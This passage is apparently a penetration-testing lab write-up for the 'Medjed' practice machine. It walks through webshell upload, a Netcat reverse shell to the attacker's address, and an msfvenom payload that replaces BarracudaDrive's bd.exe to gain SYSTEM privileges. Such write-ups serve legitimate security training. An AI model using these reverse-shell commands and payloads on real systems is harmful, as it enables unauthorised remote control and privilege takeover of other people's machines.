![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h01m34s_006.png)

By doing a directory busting on port 45332 we find the phpinfo.php page and learn that the website file is located at C:\xampp\htdocs.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h10m12s_007.png)

Uploading php webshell file and Netcat program.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h14m34s_008.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h16m05s_009.png)

Browsing to webshell page.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h17m14s_010.png)

Starting a listener and executing the reverse shell command.

```
nc -e cmd.exe 192.168.49.109 8000
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h20m10s_011.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h21m03s_012.png)

### Privilege Escalation

We can find BarracudaDrive 6.5 has a insecure folder permissions exploit on exploit-db. We know that the BarracudaDrive version is also 6.5 through the about page of the website.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h23m18s_013.png)

Confirming execution privilege.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h41m07s_014_.png)

According to the vulnerability description we create a reverse shell payload.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.109 LPORT=8000 -f exe > bd.exe
```
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h52m02s_015_.png)

Uploading the payload file and replacing the original bd.exe.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_18h09m14s_016.png)

We reboot the machine and wait for a while to get the shell with nt authority\system permission.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_18h09m42s_017.png)
